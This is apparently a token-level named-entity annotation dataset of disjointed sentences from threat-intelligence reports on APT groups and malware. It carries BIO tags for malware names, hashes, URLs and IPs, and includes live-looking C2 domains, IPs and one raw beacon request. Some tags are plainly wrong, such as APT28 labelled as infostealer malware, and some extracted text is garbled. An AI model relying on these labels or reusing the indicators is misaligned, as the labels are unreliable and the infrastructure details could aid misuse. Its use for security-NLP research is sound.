documents	O
we	O
've	O
observed	O
,	O
there	O
is	O
the	O
possibility	O
that	O
Palestinians	O
have	O
been	O
targeted	O
as	O
well	O
.	O

To	O
steal	O
defense	O
related	O
information	O
and	O
proprietary	O
product	O
information	O
that	O
can	O
provide	O
their	O
sponsoring	O
governments	O
with	O
military	O
and	O
economic	O
advantages	O
.	O

6a8057322e62c569924ea034508068c9	B-hash
Server	O
Platino4	O

http://siblog.mcafee.com/cto/operation-%E2%80%9Caurora%E2%80%9D-hit-google-others/	B-url.unknown
http://www.thetechherald.com/article.php/201004/	B-url.unknown
5151/Was-Operation-Aurora-nothing-more-than-a-conventional-attack	O
http://www.fjbmcu.com/chengxu/crcsuan.htm	B-url.unknown
(	O
via	O
:	O
http://www.secureworks.com/research/blog/index.php/2010/01/20/	B-url.unknown
operation-aurora-clues-in-the-code/	O
)	O
http://www.avertlabs.com/research/blog/index.php/2010/01/18/an-insight-into-the-aurora-communication-protocol/	B-url.unknown
http://www.symantec.com/connect/blogs/trojanhydraq-incident-analysis-aurora-0-day-exploit	B-url.unknown

The	O
initial	O
penetration	O
vector	O
was	O
carried	O
out	O
by	O
social	O
engineering	O
.	O

To	O
contribute	O
something	O
new	O
to	O
the	O
public	O
knowledge	O
base—especially	O
for	O
those	O
who	O
happen	O
to	O
find	O
the	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
server-side	O
payload	O
on	O
one	O
of	O
their	O
Web	O
servers—FireEye	O
studied	O
the	O
components	O
,	O
capabilities	O
,	O
payload	O
attributes	O
,	O
and	O
the	O
detection	O
rate	O
of	O
this	O
4	O
kilobyte	O
menace	O
.	O

Also	O
none	O
of	O
the	O
binaries	O
makes	O
attempts	O
of	O
hiding	O
its	O
intentions	O
,	O
which	O
is	O
a	O
common	O
trait	O
among	O
targeted	O
malware	O
.	O

Often	O
these	O
are	O
military	O
or	O
military-technology	O
and	O
manufacturing	O
related	O
,	O
and	O
here	O
,	O
the	O
DealersChoice	B-malware.backdoor
spearphish	O
is	O
again	O
NATO	O
related	O
:	O
The	O
global	O
reach	O
that	O
coincided	O
with	O
this	O
focus	O
on	O
NATO	O
and	O
the	O
Ukraine	O
could	O
n't	O
be	O
overstated	O
.	O

Threats	O
from	O
IOCs	O

GData	O
;	O
Paul	O
Rascagneres	O
;	O
COM	O
Object	O
hijacking	O
:	O
the	O
discreet	O
way	O
of	O
persistence	O
:	O
An	O
Analysis	O
of	O
a	O
new	O
persistence	O
mechanism	O
in	O
the	O
wild	O
;	O
published	O
30.10.2014	O
;	O
https://blog.gdatasoftware.com/blog/article/com-object-hijacking-the-discreet-way-of-persistence.html	O

XXXXXXXXXXXXXXX	O
,	O
decode	O
the	O
buffer	O
by	O
starting	O
at	O
the	O
last	O
byte	O
and	O
XORing	O
each	O
previous	O
byte	O
by	O
the	O
current	O
byte	O
value	O
in	O
reverse	O
order	O
;	O
the	O
server	O
variant	O
will	O
then	O
use	O
a	O
specific	O
portion	O
of	O
the	O
configuration	O
blob	O
as	O
the	O
infection	O
ID	O
's	O
base	O
.	O

To	O
date	O
,	O
all	O
observed	O
attacks	O
were	O
the	O
result	O
of	O
spear	O
phishing	O
attempts	O
against	O
the	O
victim	O
organizations	O
.	O

All	O
rights	O
reserved	O
.	O

dXNlcnMgbmFtZSBhbmQgcGFzc3dvcmQ=	O

fCompressedPayload	O
field	O
is	O
non-zero	O
,	O
then	O
the	O
data	O
within	O
the	O
payload	O
is	O
compressed	O
using	O
LZO	O
compression	O
(	O
prior	O
to	O
XOR	O
encoding	O
)	O
and	O
the	O
dwDecompressedSize	O
field	O
represents	O
the	O
final	O
size	O
of	O
the	O
payload	O
data	O
after	O
decompression	O
.	O

The	O
sample	O
connects	O
to	O
the	O
following	O
domains	O
:	O

Lazarus	O
malware	O
families	O
(	O
like	O
Hangman	B-malware.backdoor
(	O
Intel	O
Card	O
)	O
,	O
Duuzer	B-malware.backdoor
(	O
Intel	O
Card	O
)	O
,	O
Volgmer	B-malware.backdoor
(	O
Intel	O
Card	O
)	O
,	O
SpaSpe	B-malware.unknown
(	O
Intel	O
Card	O
)	O
,	O
etc	O
.	O
)	O

Use	O
antivirus	O
software	O
.	O

Invitation.jar	B-malware.infosteal

Like	O
rtniczw.sys	O
,	O
the	O
file	O
rndismpc.sys	O
had	O
never	O
been	O
encountered	O
on	O
our	O
users	O
'	O
machines	O
.	O

According	O
to	O
the	O
WHOIS	O
records	O
,	O
the	O
server	O
is	O
located	O
in	O
Hong	O
Kong	O
The	O
information	O
is	O
sent	O
to	O
the	O
command	O
and	O
control	O
through	O
HTTPS	O
communication	O
using	O
a	O
POST	O
method	O
.	O

The	O
following	O
Heatmap	O
shows	O
that	O
the	O
IP	O
address	O
(	O
41.208.110.46	B-ip.unknown
)	O
has	O
been	O
used	O
to	O
launch	O
attacks	O
since	O
9/9/2015	O
until	O
the	O
time	O
of	O
writing	O
this	O
report	O
using	O
5	O
different	O
hostnames	O
and	O
multiple	O
malicious	O
malwares	O
.	O

The	O
database	O
client	O
example	O
shown	O
in	O
Figure	O
21	O
is	O
MySQL	O
instead	O
of	O
MS-SQL	O
,	O
but	O
it	O
offers	O
many	O
of	O
the	O
same	O
capabilities	O
.	O

Figure	O
4	O
:	O
Initial	O
Beacon	O
.	O

The	O
location	O
of	O
Darkhotel	B-malware.infosteal
's	O
targets	O
and	O
victims	O
in	O
2015	O
:	O
●	O
North	O
Korea	O
●	O
Russia	O
●	O
South	O
Korea	O
●	O
Japan	O
●	O
Bangladesh	O
●	O
Thailand	O
●	O
Mozambique	O
●	O
Germany	O
India	O
2015	O
Darkhotel	B-malware.infosteal
.hta	O
and	O
backdoor-related	O
,	O
exploit-related	O
and	O
c2	O
sites	O
:	O
tisone360[.]org	B-url.unknown
●	O
storyonboard[.]net	B-url.unknown
●	O
openofficev[.]info	B-url.unknown
●	O
saytargetworld[.]net	B-url.unknown
●	O
error-page[.]net	B-url.unknown
●	O
eonlineworld[.]net	B-url.unknown
●	O
enewsbank[.]net	B-url.unknown
thewordusrapid[.]com	B-url.unknown
2015	O
spearphishing	O
incident	O
attachment	O
name	O
subset	O
:	O
●	O
schedule	O
(	O
6.1~6	O
)	O
.rar	O
-	O
>	O
schedule	O
(	O
6.1~6	O
)	O
_?gpj.scr	O
●	O
schedule	O
(	O
2.11~16	O
)	O
.rar	O
-	O
>	O
schedule	O
(	O
2.11~16	O
)	O
_?gpj.scr	O
●	O
congratulation.rar	O
-	O
>	O
congratulation_?gpj.scr	O
letter.rar	O
-	O
>	O
letter_?gpj.scr	O

The	O
attackers	O
'	O
preference	O
to	O
use	O
a	O
fileless	B-malware.unknown
infrastructure	O
specifically	O
in	O
conjunction	O
with	O
Cobalt	O
Strike	O
is	O
very	O
evident	O
.	O

While	O
the	O
are	O
many	O
rumours	O
and	O
speculations	O
circulating	O
in	O
the	O
InfoSec	O
community	O
,	O
at	O
the	O
time	O
of	O
writing	O
,	O
there	O
was	O
no	O
publicly	O
available	O
evidence	O
that	O
can	O
confirm	O
that	O
the	O
OceanLotus	O
Group	O
is	O
a	O
nation-state	O
threat	O
actor	O
.	O

Proximity	O
to	O
such	O
sensitive	O
security	O
programs	O
suggest	O
a	O
certain	O
level	O
of	O
trust	O
on	O
behalf	O
of	O
the	O
Pakistani	O
government	O
,	O
and	O
may	O
indicate	O
that	O
official	O
Pakistani	O
entities	O
could	O
have	O
access	O
to	O
Tranchulas	O
technical	O
support	O
for	O
various	O
security	O
projects	O
or	O
programs	O
.	O

The	O
name	O
'	O
Inception	B-malware.backdoor
'	O
comes	O
from	O
the	O
group	O
's	O
many	O
levels	O
of	O
obfuscation	O
and	O
indirection	O
it	O
employed	O
in	O
delivering	O
this	O
payload	O
.	O

The	O
attack	O
begins	O
with	O
a	O
phishing	O
email	O
sent	O
to	O
targets	O
that	O
includes	O
an	O
attachment	O
of	O
a	O
self-extracting	O
archive	O
containing	O
two	O
files	O
:	O
a	O
Word	O
document	O
and	O
a	O
malicious	O
executable	O
.	O

The	O
enumeration	O
function	O
issues	O
the	O
commands	O
'	O
SELECT	O
*	O
FROM	O
AntiVirusProduct	O
'	O
and	O
retrieves	O
attributes	O
such	O
as	O
'	O
productState	O
'	O
,	O
'	O
DisplayName	O
'	O
,	O
'	O
VersionNumber	O
'	O
and	O
'	O
productUptoDate	O
'	O
.	O

Uploaded	O
documents	O
from	O
the	O
victim	O
of	O
another	O
campaign	O
found	O
on	O
Operation	B-malware.ransom
Manul	I-malware.ransom
C2	O
servers	O
.	O

They	O
are	O
evolving	O
slowly	O
,	O
but	O
basically	O
their	O
features	O
have	O
not	O
changed	O
over	O
the	O
last	O
few	O
months	O
.	O

But	O
Dino	B-malware.backdoor
also	O
shows	O
a	O
poor	O
knowledge	O
,	O
or	O
interest	O
,	O
from	O
these	O
developers	O
in	O
anti­analysis	O
techniques	O
–	O
contrary	O
to	O
what	O
was	O
seen	O
in	O
Casper	B-malware.unknown
–	O
as	O
demonstrated	O
,	O
for	O
example	O
,	O
by	O
the	O
verbosity	O
of	O
some	O
Dino	B-malware.backdoor
's	O
log	O
messages	O
:	O
All	O
those	O
messages	O
provide	O
substantial	O
help	O
in	O
understanding	O
Dino	B-malware.backdoor
's	O
internal	O
workings	O
.	O

9	O
.	O

4	O
Oct	O
.	O

Zecho123	O
,	O
Echo	O
/	O
Sound	O
Test	O
Service	O
,	O
,YES	O
,	O
NO	O

Communication	O
between	O
the	O
client	O
and	O
the	O
server	O
variant	O
exists	O
in	O
the	O
form	O
of	O
a	O
sequence	O
of	O
encrypted	O
datagrams	O
.	O

If	O
the	O
user	O
copies	O
a	O
Bitcoin	O
address	O
to	O
the	O
clipboard	O
,	O
it	O
will	O
be	O
replaced	O
by	O
an	O
address	O
pre-configured	O
by	O
the	O
botmaster	O
.	O

For	O
example	O
,	O
a	O
file	O
received	O
by	O
us	O
as	O
'd.exe	O
'	O
,	O
(	O
MD5	O
1f1e9958440d773c34415d9eb6334b25	B-hash
)	O
,	O
found	O
in	O
Palestine	O
Nov	O
17	O
th	O
last	O
year	O
,	O
shows	O
a	O
PDF	O
document	O
with	O
content	O
seemingly	O
taken	O
from	O
'	O
Palestine	O
Now	O
'	O
(	O
www.paltimes.net	B-url.unknown
)	O
:	O

If	O
an	O
error	O
was	O
detected	O
,	O
the	O
communication	O
library	O
's	O
method	O
SafeAppendProgramMod	O
attempted	O
to	O
reset	O
the	O
controller	O
to	O
the	O
previous	O
state	O
using	O
a	O
TriStation	O
protocol	O
command	O
.	O

It	O
filters	O
each	O
attempt	O
to	O
open	O
the	O
ZxShell	B-malware.backdoor
protected	O
driver	O
or	O
the	O
main	O
DLL	O
,	O
returning	O
a	O
reference	O
to	O
the	O
'	O
netstat.exe	O
'	O
file	O
.	O

Upon	O
successful	O
exploitation	O
the	O
decoded	O
binary	O
will	O
be	O
written	O
first	O
to	O
then	O
copied	O
to	O
.	O

This	O
source	O
's	O
commentary	O
forms	O
the	O
basis	O
for	O
the	O
background	O
on	O
the	O
genesis	O
of	O
Iran	O
's	O
offensive	O
cyber	O
efforts	O
.	O

The	O
sample	O
also	O
uses	O
the	O
following	O
file	O
for	O
logging	O
:	O

Just	O
like	O
yesterday	O
,	O
we	O
have	O
grown	O
maturely	O
in	O
our	O
relationship	O
.	O

4.5.2	O
Registry	O

Microsoft	O
confirmed	O
this	O
vulnerability	O
on	O
the	O
morning	O
of	O
April	O
20th	O
and	O
released	O
an	O
official	O
security	O
patch	O
on	O
May	O
8th	O
.	O

It	O
all	O
started	O
one	O
day	O
when	O
we	O
encountered	O
a	O
somewhat	O
unsophisticated	O
spy	O
program	O
that	O
communicated	O
with	O
its	O
'	O
master	O
'	O
via	O
a	O
public	O
e-mail	O
server	O
.	O

ESET	O
published	O
a	O
decryption	O
tool	O
for	O
Win32/Filecoder.AESNI	O
ransomware	O
,	O
and	O
this	O
event	O
did	O
n't	O
gain	O
much	O
media	O
attention	O
.	O

MARCH	O
-	O
OCTOBER	O
2016	O
The	O
DNC	O
announced	O
it	O
had	O
suffered	O
a	O
network	O
compromise	O
and	O
that	O
a	O
subsequent	O
investigation	O
found	O
evidence	O
of	O
two	O
breaches	O
,	O
attributed	O
to	O
APT28	B-malware.infosteal
and	O
APT29	B-malware.infosteal
.	O

Given	O
the	O
encrypted	O
,	O
and	O
potentially	O
compressed	O
,	O
nature	O
of	O
Derusbi	B-malware.backdoor
server	O
variant	O
network	O
traffic	O
,	O
detecting	O
the	O
traffic	O
on	O
a	O
network	O
can	O
be	O
problematic	O
using	O
traditional	O
IDS	O
signatures	O
.	O

The	O
TRITON	B-malware.infosteal
attack	O
tool	O
was	O
built	O
with	O
a	O
number	O
of	O
features	O
,	O
including	O
the	O
ability	O
to	O
read	O
and	O
write	O
programs	O
,	O
read	O
and	O
write	O
individual	O
functions	O
and	O
query	O
the	O
state	O
of	O
the	O
SIS	O
controller	O
.	O

Air	O
China	O
2015	O
April	O
TIMETABLE	O
.xls	O
Initial	O
Infection	O
Vector/	O
XLS	O
file	O
Drops	O
the	O
downloader	O
71a52058f6b5cef66302c19169f67cf304507b4454cca83e2c36151da8da1d97	B-hash

get_time	O
delete_inf	O
delete_con	O

The	O
snooped	O
keystroke	O
data	O
is	O
passed	O
to	O
a	O
thread	O
,	O
which	O
performs	O
encryption	O
and	O
dumps	O
the	O
data	O
to	O
a	O
log	O
file	O
.	O

member	O
function	O
queues	O
incoming	O
packets	O
into	O
a	O
received	O
queue	O
while	O

The	O
most	O
distinctive	O
characteristic	O
of	O
this	O
library	O
is	O
the	O
custom	O
URI	O
encoding	O
algorithm	O
.	O

But	O
,	O
we	O
will	O
still	O
simply	O
present	O
some	O
facts	O
concerning	O
this	O
actor	O
.	O

All	O
rights	O
reserved	O
.	O

Msfte.dll	O
--	O
--	O
--	O
--	O
--	O
--	O
Variant	O
of	O
Backdoor.Win32.Denis	B-malware.backdoor

Both	O
50.63.202.94	B-ip.unknown
and	O
64.202.189.170	B-ip.unknown
are	O
very	O
busy	O
domains	O
.	O

YPrat	O

After	O
this	O
executable	O
compromises	O
the	O
endpoint	O
,	O
this	O
sample	O
then	O
generated	O
command	O
and	O
control	O
traffic	O
to	O
:	O
GET	O
/s/asp	O
?	O
XAAAAM4w5jmOS_kMZlr67o8jettxsYA8dZgeNAHes­Nn5p­6AFUD6yncpz5AL6wAAA==p=1	O
HTTP/1.1	O
User­Agent	O
:	O
Mozilla/4.0	O
(	O
compatible	O
;	O
)	O
Accept	O
:	O
*/*	O
Host	O
:	O
bee.businessconsults.net	O
As	O
early	O
as	O
March	O
2011	O
,	O
Joe	O
Stewart	O
at	O
Dell	O
SecureWorks	O
reported	O
that	O
various	O
subdomains	O
off	O
the	O
primary	O
domain	O
of	O
'	O
businessconsults.net	O
'	O
have	O
acted	O
as	O
command	O
and	O
control	O
nodes	O
for	O
the	O
well­known	O
'	O
HUC	O
Packet	O
Transmit	O
Tool	O
'	O
(	O
aka	O
'	O
HTran	O
'	O
)	O
,	O
which	O
is	O
a	O
light­weight	O
TCP	O
proxy	O
tool	O
used	O
by	O
the	O
nation	O
state	O
threat	O
actor	O
that	O
breached	O
RSA	O
around	O
that	O
time	O
,	O
labeled	O
by	O
McAfee	O
as	O
'	O
Operation	O
Shady	O
RAT	O
.	O
'	O

안다리엘	O
그룹은	O
한국에서	O
활동하고	O
있는	O
위협	O
그룹	O
중	O
가장	O
왕성히	O
활동하고	O
있는	O
그룹이다	O
.	O

Several	O
weeks	O
ago	O
,	O
we	O
identified	O
the	O
use	O
of	O
the	O
latest	O
version	O
of	O
this	O
RAT	B-malware.drop
(	O
Remote	O
Access	O
Tool	O
)	O
.	O

TUDIES	O
REVIOUS	O
AJOR	O
YBER	O
TTACKS	O

©	O
AhnLab	O
,	O
Inc	O
.	O

10006158	O
66	O
09	O
67	O
09	O
27	O
09	O
6A	O
09	O
66	O
09	O
64	O
09	O
f.g.'.j.f.d.	O

Fig	O
9	O
.	O

One	O
will	O
also	O
appreciate	O
the	O
numerous	O
misspellings	O
contained	O
in	O
the	O
messages	O
.	O

These	O
two	O
facts	O
compelled	O
us	O
take	O
a	O
closer	O
look	O
at	O
this	O
malware	O
--	O
Korean	O
compilers	O
alongside	O
Bulgarian	O
email	O
command-and-control	O
communications	O
.	O

Less	O
traditional	O
tools	O
available	O
With	O
more	O
crimeware	O
author	O
arrests	O
and/or	O
disappearance	O
of	O
a	O
number	O
of	O
banking	O
Trojan	O
developers	O
,	O
cybercriminals	O
are	O
resorting	O
to	O
using	O
RATs	B-malware.backdoor
to	O
manually	O
steal	O
data	O
,	O
such	O
as	O
banking	O
and	O
credit	O
card	O
details	O
.	O

The	O
wider	O
lesson	O
learned	O
here	O
may	O
be	O
that	O
criminals	O
are	O
conducting	O
more	O
and	O
more	O
sophisticated	O
attacks	O
against	O
victim	O
organisations	O
,	O
particularly	O
in	O
the	O
area	O
of	O
network	O
intrusions	O
(	O
which	O
has	O
traditionally	O
been	O
the	O
domain	O
of	O
the	O
'	O
APT	O
'	O
actor	O
)	O
.	O

Any	O
discrepancies	O
or	O
differences	O
created	O
in	O
the	O
translation	O
are	O
not	O
binding	O
and	O
have	O
no	O
legal	O
effect	O
for	O
compliance	O
or	O
enforcement	O
purposes	O
.	O

Times	O
of	O
illegitimate	O
connections	O
with	O
the	O
server	O
(	O
GMT+3	O
)	O
Times	O
of	O
illegitimate	O
connections	O
with	O
the	O
server	O
(	O
GMT+3	O
)	O

6776bda19a3a8ed4c2870c34279dbaa9	O
-	O
Note_No107-41D.pdf	O
dba209c99df5e94c13b1f44c0f23ef2b	O
-	O
unknown.PDF	O
f44b1dea7e56b5eac95c12732d9d6435	O
-	O
unknown.PDF	O
4c65126ae52cadb76ca1a9cfb8b4ce74	O
-	O
unknown.PDF	O

Therefore	O
,	O
separate	O
services	O
can	O
run	O
,	O
depending	O
on	O
how	O
and	O
where	O
Svchost.exe	O
is	O
started	O
.	O

scada.exe	B-malware.unknown
Payload	O

The	O
payload	O
section	O
is	O
encrypted	O
with	O
a	O
key	O
selected	O
by	O
using	O
GetTickCount	O
.	O

The	O
malware	O
attempts	O
to	O
resolve	O
'	O
www.goole[.]com	B-url.unknown
'	O
(	O
most	O
likely	O
a	O
misspelling	O
)	O
.	O

The	O
resulting	O
combination	O
of	O
these	O
two	O
obfuscation	O
techniques	O
creates	O
'	O
beautiful	O
'	O
graphs	O
:	O

/windowsxp/SSports.asp?HostID=	O
/windowsxp/SWeather.asp?HostID=	O
/windowsxp/SJobs.asp?HostID=	O
/windowsxp/STravel.asp?HostID=	O
/windowsxp/NfHostInfo.asp?NickId=	O
/windowsxp/SGames.asp?HostID=	O

The	O
inoculation	O
shot	O
is	O
a	O
small	O
,	O
signed	O
binary	O
that	O
will	O
allow	O
you	O
to	O
scan	O
for	O
,	O
and	O
optionally	O
remove	O
,	O
this	O
malware	O
from	O
your	O
Enterprise	O
network	O
.	O

To	O
verify	O
the	O
usage	O
of	O
steganography	O
,	O
we	O
employed	O
the	O
tool	O
StegExpose	O
to	O
check	O
the	O
 le	O
:	O
The	O
result	O
con rms	O
the	O
presence	O
of	O
hidden	O
data	O
in	O
our	O
 le	O
.	O

HOME	O
AND	O
HOME	O
OFFICE	O
|	O
FOR	O
BUSINESS	O
|	O
SECURITY	O
INTELLIGENCE	O
|	O
ABOUT	O
TREND	O
MICRO	O
Asia	O
Pacific	O
Region	O
(	O
APAC	O
)	O
:	O
Australia	O
/	O
New	O
Zealand	O
,	O
,	O
,	O
,	O
Europe	O
,	O
Middle	O
East	O
,	O
&	O
Africa	O
Region	O
(	O
EMEA	O
)	O
:	O
France	O
,	O
Deutschland	O
/	O
Österreich	O
/	O
Schw	O
eiz	O
,	O
Italia	O
,	O
Россия	O
,	O
España	O
,	O
United	O
Kingdom	O
/	O
Ireland	O
Latin	O
America	O
Region	O
(	O
LAR	O
)	O
:	O
Brasil	O
,	O
México	O
North	O
America	O
Region	O
(	O
NABU	O
)	O
:	O
United	O
States	O
,	O
Canada	O
Privacy	O
Statement	O
Legal	O
Policies	O
Copyright	O
©	O
2018	O
Trend	O
Micro	O
Incorporated	O
.	O

Politico	O
.	O

Sends	O
by	O
posting	O
to	O
hxxp[:]//techwach[.]comAdditionally	B-url.unknown
,	O
the	O
malware	O
is	O
designed	O
to	O
be	O
able	O
to	O
send	O
the	O
contacts	O
,	O
location	O
,	O
and	O
images	O
from	O
the	O
compromised	O
device	O
.	O

3	O

This	O
leaves	O
,	O
at	O
a	O
minimum	O
,	O
a	O
small	O
Flash	O
loader	O
that	O
defenders	O
can	O
flag	O
for	O
detection	O
and	O
analysts	O
can	O
fingerprint	O
for	O
tracking	O
.	O

Our	O
private	O
GReAT	O
report	O
on	O
this	O
activity	O
pushed	O
in	O
February	O
2017	O
,	O
and	O
a	O
public	O
report	O
from	O
another	O
vendor	O
described	O
much	O
of	O
the	O
same	O
content	O
almost	O
seven	O
months	O
later	O
as	O
'	O
Gayzer	O
'	O
.	O

In	O
2011-2012	O
,	O
the	O
group	O
used	O
a	O
relatively	O
tiny	O
implant	O
(	O
known	O
as	O
'	O
Sofacy	O
'	O
or	O
SOURFACE	O
)	O
as	O
their	O
first	B-malware.backdoor
stage	I-malware.backdoor
malware	O
,	O
which	O
at	O
the	O
time	O
had	O
similarities	O
with	O
the	O
old	O
Miniduke	B-malware.backdoor
implants	O
.	O

info.winupdate[.]net	B-url.cncsvr
|	O
122.10.36.94	B-ip.unknown

In	O
March	O
2016	O
,	O
CTU	O
researchers	O
identified	O
a	O
spearphishing	O
campaign	O
using	O
Bitly	O
accounts	O
to	O
shorten	O
malicious	O
URLs	O
.	O

Figure	O
14	O
.	O

'	O
WADA	O
Confirms	O
Attack	O
by	O
Russian	O
Cyber	O
Espionage	O
Group	O
.	O
'	O

All	O
commands	O
are	O
executed	O
using	O
the	O
System.DirectoryServices	O
API	O
.	O

Our	O
investigation	O
begins	O
by	O
taking	O
a	O
look	O
at	O
the	O
following	O
file	O
:	O
ecc240f1983007177bc5bbecba50eea27b80fd3d14fd261bef6cda10b8ffe1e9	B-hash
.	O

Tags	O
:	O
Cyber	O
Espionage	O
,	O
India	O
,	O
Pakistan	O
,	O
South	O
Asia	O
,	O
Telenor	O
Next	O
article	O
Previous	O
article	O
No	O
Comments	O

We	O
see	O
that	O

After	O
realizing	O
that	O
the	O
PowerShell	O
infrastructure	O
had	O
been	O
discovered	O
,	O
the	O
attackers	O
had	O
to	O
quickly	O
replace	O
it	O
to	O
maintain	O
persistence	O
and	O
continue	O
the	O
operation	O
.	O

For	O
more	O
information	O
,	O
visit	O
https://www.nist.gov/cyberframework	B-url.normal
or	O
email	O
cyberframework@nist.gov	O
.	O

They	O
have	O
extensive	O
checks	O
for	O
the	O
various	O
security	O
software	O
that	O
is	O
installed	O
on	O
the	O
system	O
and	O
their	O
specific	O
configurations	O
.	O

Coder	O
:	O
:b64Decode	O
(	O
char	O
*	O
,	O
uint	O
,	O
uint	O
*	O
,	O
char	O
*	O
)	O
Coder	O
:	O
:base64UrlEncode	O
(	O
uchar	O
*	O
,	O
uint	O
,	O
uint	O
*	O
)	O
Coder	O
:	O
:b64Encode	O
(	O
uchar	O
*	O
,	O
uint	O
,	O
uint	O
*	O
,	O
char	O
*	O
)	O
Coder	O
:	O
:base64Decode	O
(	O
char	O
*	O
,	O
uint	O
,	O
uint	O
*	O
)	O
Coder	O
:	O
:base64Encode	O
(	O
uchar	O
*	O
,	O
uint	O
,	O
uint	O
*	O
)	O

File	O
Name	O
:	O
DBC_BANK_IMG_23456_156.jar	B-malware.infosteal
File	O
Size	O
:	O
50508	O
bytes	O
MD5	O
:	O
fca329c46f50e031597babe07fee46a8	B-hash
SHA1	O
:	O
5c1a2351749c864a38473aafe1146de4eb4de40d	B-hash

To	O
enhance	O
visibility	O
into	O
the	O
further	O
distribution	O
of	O
their	O
phishing	O
lures	O
,	O
APT32	B-malware.infosteal
utilized	O
the	O
native	O
web	O
page	O
functionality	O
of	O
their	O
ActiveMime	O
documents	O
to	O
link	O
to	O
external	O
images	O
hosted	O
on	O
APT32	B-malware.infosteal
monitored	O
infrastructure	O
.	O

The	O
experiments	O
are	O
sometimes	O
clearly	O
successful	O
.	O

As	O
an	O
example	O
,	O
we	O
might	O
see	O
extraneous	O
data	O
in	O
their	O
SSL/TLS	O
certificates	O
that	O
give	O
away	O
information	O
about	O
their	O
provider	O
or	O
resources	O
.	O

Exhibit	O
2	O
:	O
VBA	O
Macro	O

Our	O
innovative	O
solutions	O
for	O
consumers	O
,	O
businesses	O
and	O
governments	O
provide	O
layered	O
content	O
security	O
to	O
protect	O
information	O
on	O
mobile	O
devices	O
,	O
endpoints	O
,	O
gateways	O
,	O
servers	O
and	O
the	O
cloud	O
.	O

The	O
controller	O
can	O
post	O
victim-specific	O
tasks	O
as	O
well	O
as	O
global	O
specific	O
tasks	O
to	O
the	O
server	O
.	O

Users	O
rarely	O
check	O
the	O
full	O
URL	O
associated	O
with	O
short	O
links	O
,	O
so	O
threat	O
groups	O
can	O
use	O
URL-shortening	O
services	O
to	O
effectively	O
hide	O
malicious	O
URLs	O
.	O

The	O
exploit	O
was	O
copied	O
from	O
an	O
online	O
source	O
,	O
likely	O
from	O
here	O
,	O
as	O
the	O
code	O
included	O
the	O
same	O
comments	O
.	O

See	O
the	O
United	O
States	O
Computer	O
Emergency	O
Readiness	O
Team	O
(	O
US-CERT	O
)	O
Publication	O
on	O
SQL	O
Injection	O
for	O
more	O
information	O
.	O

The	O
'	O
US$25k.jar	B-malware.infosteal
'	O
malware	O
beaconed	O
to	O
'	O
toba.no-ip[.]biz	B-malware.infosteal
'	O
over	O
port	O
'	O
1505	O
'	O
.	O

E	O
NTIT	O
Y	O

You	O
agree	O
that	O
access	O
to	O
and	O
use	O
of	O
and	O
reliance	O
on	O
this	O
document	O
and	O
the	O
content	O
thereof	O
is	O
at	O
your	O
own	O
risk	O
.	O

page	O
|	O
14	O

Hardware	O
UUID	O

157Xqdeo15Mg15TXpNeg15nXnQ==	O

The	O
following	O
information	O
warns	O
the	O
security	O
community	O
and	O
users	O
of	O
how	O
this	O
attack	O
works	O
.	O

29	O
Dec	O
.	O

This	O
is	O
a	O
very	O
important	O
detail	O
,	O
as	O
the	O
forensic	O
value	O
of	O
the	O
VBR	O
is	O
substantial	O
(	O
See	O
Figure	O
2	O
)	O
.	O

Bot	O
:	O

By	O
Tom	O
Lancaster	O
Follow	O
@	O
tlansec	O
This	O
short	O
report	O
details	O
the	O
techniques	O
being	O
used	O
in	O
a	O
series	O
of	O
attacks	O
mostly	O
against	O
Israel­based	O
organisations	O
.	O

This	O
document	O
also	O
includes	O
the	O
reporting	O
of	O
previously	O
unknown	O
malware	O
indicators	O
and	O
hashes	O
.	O

Hancom	O
Office	O
is	O
widely	O
used	O
in	O
South	O
Korea	O
.	O

This	O
platform	O
can	O
be	O
conventionally	O
named	O
as	O
'	O
Tilded	O
'	O
as	O
its	O
authors	O
are	O
,	O
for	O
some	O
reason	O
,	O
inclined	O
to	O
use	O
file	O
names	O
which	O
start	O
with	O
'	O
~d	O
'	O
.	O

Dino	B-malware.backdoor
contains	O
interesting	O
technical	O
features	O
,	O
and	O
also	O
a	O
few	O
hints	O
that	O
the	O
developers	O
are	O
French	O
speaking	O
.	O

Install	O
a	O
keylogger	O
for	O
intercepting	O
credentials	O
on	O
Google	O
Chrome	O
4	O
.	O

Dirsearch	O
—	O
a	O
simple	O
command-line	O
tool	O
for	O
brute	O
forcing	O
(	O
performing	O
exhaustive	O
searches	O
of	O
)	O
directories	O
and	O
files	O
on	O
websites	O
.	O

T	O
able	O
2.Re	O
so	O
ur	O
ce	O
s	O
t	O
hat	O
we	O
r	O
e	O
scanne	O
dfromo	O
ne	O
oft	O
he	O
inf	O
e	O
ct	O
e	O
d	O
se	O
r	O
ve	O
rsT	O
able	O
2.Re	O
so	O
ur	O
ce	O
s	O
t	O
hat	O
we	O
r	O
e	O
scanne	O
dfromo	O
ne	O
oft	O
he	O
inf	O
e	O
ct	O
e	O
d	O
se	O
r	O
ve	O
r	O
s	O
Co	O
unt	O
r	O
y	O
Co	O
unt	O
r	O
y	O
(	O
base	O
dont	O
he	O
(	O
base	O
dont	O
he	O
co	O
nt	O
e	O
nt	O
)	O
co	O
nt	O
e	O
nt	O
)	O
De	O
scr	O
ipt	O
io	O
n	O
De	O
scr	O
ipt	O
io	O
n	O

By	O
studying	O
the	O
new	O
persona	O
,	O
root9B	O
discovered	O
they	O
had	O
previously	O
created	O
several	O
domains	O
and	O
websites	O
,	O
all	O
of	O
which	O
have	O
been	O
flagged	O
as	O
Fake	O
Financial	O
Institutions	O
by	O
security	O
analysts	O
.	O

Investigators	O
found	O
that	O
John	O
Podesta	O
,	O
Hillary	O
Clinton	O
's	O
presidential	O
campaign	O
chairman	O
,	O
was	O
one	O
of	O
thousands	O
of	O
individuals	O
targeted	O
in	O
a	O
mass	O
phishing	O
scheme	O
using	O
shortened	O
URLs	O
that	O
security	O
researchers	O
attributed	O
to	O
APT28	B-malware.infosteal
.	O

One	O
theory	O
is	O
that	O
the	O
Stuxnet	B-malware.backdoor
C	O
&	O
C	O
was	O
trying	O
to	O
replace	O
the	O
old	O
version	O
with	O
the	O
Realtek	O
certificate	O
with	O
a	O
new	O
one	O
.	O

It	O
's	O
somewhat	O
strange	O
to	O
see	O
such	O
heavy	O
reliance	O
on	O
older	O
Windows-specific	O
technology	O
like	O
HTML	O
applications	O
,	O
introduced	O
by	O
Microsoft	O
in	O
1999	O
.	O

This	O
is	O
a	O
targeted	O
campaign	O
believed	O
to	O
be	O
associated	O
with	O
the	O
Comment	O
Crew	O
attacker	O
group	O
because	O
of	O
the	O
use	O
of	O
encrypted/	O
